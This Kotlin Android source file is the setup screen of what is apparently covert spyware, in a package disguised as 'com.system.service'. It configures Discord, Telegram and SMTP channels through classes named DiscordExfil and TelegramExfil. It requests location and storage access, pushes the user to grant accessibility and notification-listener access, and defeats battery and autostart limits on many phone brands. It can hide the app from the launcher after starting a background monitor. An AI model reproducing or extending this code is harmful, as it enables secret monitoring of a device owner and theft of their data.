package com.system.service

import android.Manifest
import android.animation.ArgbEvaluator
import android.animation.ValueAnimator
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.view.animation.OvershootInterpolator
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import android.widget.ViewFlipper
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.material.button.MaterialButton
import com.google.android.material.switchmaterial.SwitchMaterial
import com.google.android.material.textfield.TextInputEditText
import com.system.service.core.Config
import com.system.service.core.Encryption
import com.system.service.core.Stealth
import com.system.service.core.Storage
import com.system.service.exfil.DiscordExfil
import com.system.service.exfil.TelegramExfil
import com.system.service.core.MonitorCore
import java.util.concurrent.Executors

class SetupActivity : AppCompatActivity() {

    private val executor = Executors.newSingleThreadExecutor()

    private lateinit var viewFlipper: ViewFlipper
    private lateinit var btnNext: MaterialButton
    private lateinit var btnPrev: MaterialButton
    private lateinit var dot1: View
    private lateinit var dot2: View
    private lateinit var dot3: View

    // Input fields
    private lateinit var inputWebhookUrl: TextInputEditText
    private lateinit var inputTelegramToken: TextInputEditText
    private lateinit var inputTelegramChatId: TextInputEditText
    private lateinit var inputSmtpHost: TextInputEditText
    private lateinit var inputSmtpPort: TextInputEditText
    private lateinit var inputSmtpUser: TextInputEditText
    private lateinit var inputSmtpPass: TextInputEditText
    private lateinit var inputSmtpTo: TextInputEditText
    private lateinit var inputEncryptionPassword: TextInputEditText

    // Switches
    private lateinit var switchKillSwitch: SwitchMaterial
    private lateinit var switchLocalLog: SwitchMaterial
    private lateinit var switchHideApp: SwitchMaterial

    // Permission status views
    private lateinit var statusAccessibility: TextView
    private lateinit var statusNotification: TextView
    private lateinit var statusBattery: TextView

    private var fromSecretCode = false
    private var prevAccEnabled: Boolean? = null
    private var prevNotifEnabled: Boolean? = null
    private var prevBatteryOk: Boolean? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        fromSecretCode = intent?.getBooleanExtra("FROM_SECRET_CODE", false) ?: false
        setContentView(R.layout.activity_setup)
        
        bindViews()
        loadExistingConfig()
        setupClickListeners()
        requestBasicPermissions()
        updateDots()
    }

    override fun onResume() {
        super.onResume()
        updatePermissionStatus()
        updateServiceStatus()
    }

    private fun updateServiceStatus() {
        val statusView = findViewById<TextView>(R.id.serviceStatus)
        if (MonitorCore.isRunning) {
            statusView.text = "Active - Service Running"
            statusView.setTextColor(ContextCompat.getColor(this, R.color.success))
        } else if (Config.isConfigured) {
            statusView.text = "Ready - Pending Initialization"
            statusView.setTextColor(ContextCompat.getColor(this, R.color.primary))
        } else {
            statusView.text = "Pending Configuration"
            statusView.setTextColor(ContextCompat.getColor(this, R.color.text_dim))
        }
    }

    private fun bindViews() {
        viewFlipper = findViewById(R.id.viewFlipper)
        btnNext = findViewById(R.id.btnNext)
        btnPrev = findViewById(R.id.btnPrev)
        dot1 = findViewById(R.id.dot1)
        dot2 = findViewById(R.id.dot2)
        dot3 = findViewById(R.id.dot3)

        inputWebhookUrl = findViewById(R.id.inputWebhookUrl)
        inputTelegramToken = findViewById(R.id.inputTelegramToken)
        inputTelegramChatId = findViewById(R.id.inputTelegramChatId)
        inputSmtpHost = findViewById(R.id.inputSmtpHost)
        inputSmtpPort = findViewById(R.id.inputSmtpPort)
        inputSmtpUser = findViewById(R.id.inputSmtpUser)
        inputSmtpPass = findViewById(R.id.inputSmtpPass)
        inputSmtpTo = findViewById(R.id.inputSmtpTo)
        inputEncryptionPassword = findViewById(R.id.inputEncryptionPassword)

        switchKillSwitch = findViewById(R.id.switchKillSwitch)
        switchLocalLog = findViewById(R.id.switchLocalLog)
        switchHideApp = findViewById(R.id.switchHideApp)

        statusAccessibility = findViewById(R.id.statusAccessibility)
        statusNotification = findViewById(R.id.statusNotification)
        statusBattery = findViewById(R.id.statusBattery)
    }

    private fun loadExistingConfig() {
        inputWebhookUrl.setText(Config.webhookUrl)
        inputTelegramToken.setText(Config.telegramToken)
        inputTelegramChatId.setText(Config.telegramChatId)
        inputSmtpHost.setText(Config.smtpHost)
        if (Config.smtpPort > 0) inputSmtpPort.setText(Config.smtpPort.toString())
        inputSmtpUser.setText(Config.smtpUser)
        inputSmtpPass.setText(Config.smtpPass)
        inputSmtpTo.setText(Config.smtpTo)
        inputEncryptionPassword.setText(Config.encryptionPassword)
        findViewById<SwitchMaterial>(R.id.switchKillSwitch).isChecked = Config.killSwitchEnabled
        findViewById<SwitchMaterial>(R.id.switchLocalLog).isChecked = Config.logLocal
        findViewById<SwitchMaterial>(R.id.switchHideApp).isChecked = Config.hideApp
        findViewById<SwitchMaterial>(R.id.switchBatteryOpt).isChecked = Config.batteryOptimizationEnabled
    }

    private fun updateDots() {
        val dimColor = Color.parseColor("#1AFFFFFF")
        val activeColor = ContextCompat.getColor(this, R.color.primary)
        
        dot1.setBackgroundColor(if (viewFlipper.displayedChild >= 0) activeColor else dimColor)
        dot2.setBackgroundColor(if (viewFlipper.displayedChild >= 1) activeColor else dimColor)
        dot3.setBackgroundColor(if (viewFlipper.displayedChild >= 2) activeColor else dimColor)
        
        when (viewFlipper.displayedChild) {
            0 -> {
                btnPrev.visibility = View.INVISIBLE
                btnNext.text = "Continue"
            }
            1 -> {
                btnPrev.visibility = View.VISIBLE
                btnNext.text = "Continue"
            }
            2 -> {
                btnPrev.visibility = View.VISIBLE
                btnNext.text = "Initialize System"
            }
        }
    }

    private fun setupClickListeners() {
        btnNext.setOnClickListener {
            if (viewFlipper.displayedChild < 2) {
                viewFlipper.setInAnimation(this, android.R.anim.slide_in_left)
                viewFlipper.setOutAnimation(this, android.R.anim.slide_out_right)
                viewFlipper.showNext()
                updateDots()
            } else {
                saveConfigAndStart()
            }
        }

        btnPrev.setOnClickListener {
            if (viewFlipper.displayedChild > 0) {
                // Reverse animation for back
                viewFlipper.setInAnimation(this, android.R.anim.slide_in_left)
                viewFlipper.setOutAnimation(this, android.R.anim.slide_out_right)
                viewFlipper.showPrevious()
                updateDots()
            }
        }

        // Permission cards
        findViewById<LinearLayout>(R.id.permAccessibility).setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }

        findViewById<LinearLayout>(R.id.permNotification).setOnClickListener {
            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
        }

        findViewById<LinearLayout>(R.id.permBattery).setOnClickListener {
            requestAutoStartAndBattery()
        }

        // Test buttons
        findViewById<MaterialButton>(R.id.btnTestDiscord).setOnClickListener {
            val url = inputWebhookUrl.text.toString().trim()
            if (url.isBlank()) {
                Toast.makeText(this, "Enter webhook URL first", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            testDiscord(url)
        }

        findViewById<MaterialButton>(R.id.btnTestTelegram).setOnClickListener {
            val token = inputTelegramToken.text.toString().trim()
            val chatId = inputTelegramChatId.text.toString().trim()
            if (token.isBlank() || chatId.isBlank()) {
                Toast.makeText(this, "Enter token and chat ID first", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            testTelegram(token, chatId)
        }
    }

    private fun updatePermissionStatus() {
        val accEnabled = Stealth.isAccessibilityEnabled(this)
        statusAccessibility.text = if (accEnabled) "On" else "Off"
        statusAccessibility.setTextColor(
            ContextCompat.getColor(this, if (accEnabled) R.color.success else R.color.danger)
        )
        if (prevAccEnabled == false && accEnabled) {
            animatePermissionChange(statusAccessibility, findViewById(R.id.permAccessibility))
        }
        prevAccEnabled = accEnabled

        val notifEnabled = Stealth.isNotificationListenerEnabled(this)
        statusNotification.text = if (notifEnabled) "On" else "Off"
        statusNotification.setTextColor(
            ContextCompat.getColor(this, if (notifEnabled) R.color.success else R.color.danger)
        )
        if (prevNotifEnabled == false && notifEnabled) {
            animatePermissionChange(statusNotification, findViewById(R.id.permNotification))
        }
        prevNotifEnabled = notifEnabled

        val batteryOk = !Stealth.isBatteryOptimized(this)
        statusBattery.text = if (batteryOk) "Exempt" else "Optimized"
        statusBattery.setTextColor(
            ContextCompat.getColor(this, if (batteryOk) R.color.success else R.color.danger)
        )
        if (prevBatteryOk == false && batteryOk) {
            animatePermissionChange(statusBattery, findViewById(R.id.permBattery))
        }
        prevBatteryOk = batteryOk
    }

    private fun animatePermissionChange(statusView: TextView, cardView: View) {
        cardView.animate()
            .scaleX(1.02f).scaleY(1.02f)
            .setDuration(200)
            .setInterpolator(OvershootInterpolator(2f))
            .withEndAction {
                cardView.animate()
                    .scaleX(1f).scaleY(1f)
                    .setDuration(300)
                    .start()
            }
            .start()

        val successColor = ContextCompat.getColor(this, R.color.success)
        val flashAnim = ValueAnimator.ofObject(ArgbEvaluator(), Color.WHITE, successColor)
        flashAnim.duration = 600
        flashAnim.addUpdateListener { animator ->
            statusView.setTextColor(animator.animatedValue as Int)
        }
        flashAnim.start()
    }

    private fun requestBasicPermissions() {
        val perms = mutableListOf<String>()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED) {
                perms.add(Manifest.permission.POST_NOTIFICATIONS)
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                != PackageManager.PERMISSION_GRANTED) {
                perms.add(Manifest.permission.READ_MEDIA_IMAGES)
            }
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            perms.add(Manifest.permission.ACCESS_FINE_LOCATION)
        }
        if (perms.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, perms.toTypedArray(), 1001)
        }
    }

    private fun requestAutoStartAndBattery() {
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        } catch (_: Exception) {
            try {
                startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
            } catch (_: Exception) {}
        }

        val oemIntents = listOf(
            Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")),
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity")),
            Intent().setComponent(ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity")),
            Intent().setComponent(ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity")),
            Intent().setComponent(ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager")),
            Intent().setComponent(ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")),
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")),
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")),
            Intent().setComponent(ComponentName("com.samsung.android.lool", "com.samsung.android.sm.ui.battery.BatteryActivity"))
        )

        for (intent in oemIntents) {
            try {
                if (packageManager.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY) != null) {
                    startActivity(intent)
                    break
                }
            } catch (_: Exception) {}
        }
    }

    private fun testDiscord(url: String) {
        btnNext.isEnabled = false
        executor.submit {
            val success = DiscordExfil(url).sendTest()
            runOnUiThread {
                btnNext.isEnabled = true
                Toast.makeText(this,
                    if (success) "Connection Verified!" else "Connection Failed",
                    Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun testTelegram(token: String, chatId: String) {
        btnNext.isEnabled = false
        executor.submit {
            val success = TelegramExfil(token, chatId).sendTest()
            runOnUiThread {
                btnNext.isEnabled = true
                Toast.makeText(this,
                    if (success) "Connection Verified!" else "Connection Failed",
                    Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun saveConfigAndStart() {
        if (!Stealth.isAccessibilityEnabled(this)) {
            Toast.makeText(this, "Accessibility Service must be enabled to continue.", Toast.LENGTH_LONG).show()
            return
        }

        Config.webhookUrl = inputWebhookUrl.text.toString().trim()
        Config.telegramToken = inputTelegramToken.text.toString().trim()
        Config.telegramChatId = inputTelegramChatId.text.toString().trim()
        Config.smtpHost = inputSmtpHost.text.toString().trim()
        Config.smtpPort = inputSmtpPort.text.toString().trim().toIntOrNull() ?: 587
        Config.smtpUser = inputSmtpUser.text.toString().trim()
        Config.smtpPass = inputSmtpPass.text.toString().trim()
        Config.smtpTo = inputSmtpTo.text.toString().trim()
        Config.encryptionPassword = inputEncryptionPassword.text.toString()
        Config.killSwitchEnabled = findViewById<SwitchMaterial>(R.id.switchKillSwitch).isChecked
        Config.logLocal = findViewById<SwitchMaterial>(R.id.switchLocalLog).isChecked
        Config.hideApp = findViewById<SwitchMaterial>(R.id.switchHideApp).isChecked
        Config.batteryOptimizationEnabled = findViewById<SwitchMaterial>(R.id.switchBatteryOpt).isChecked
        Config.isConfigured = true

        Encryption.invalidateKey()
        Storage.init(this)

        MonitorCore.stop()
        MonitorCore.start(this)

        Toast.makeText(this, "System active. Running in background.", Toast.LENGTH_LONG).show()

        if (Config.hideApp) {
            window.decorView.postDelayed({
                Stealth.hideFromLauncher(this)
                finish()
            }, 1000)
        } else {
            finish()
        }
    }

    override fun onDestroy() {
        executor.shutdownNow()
        super.onDestroy()
    }
}
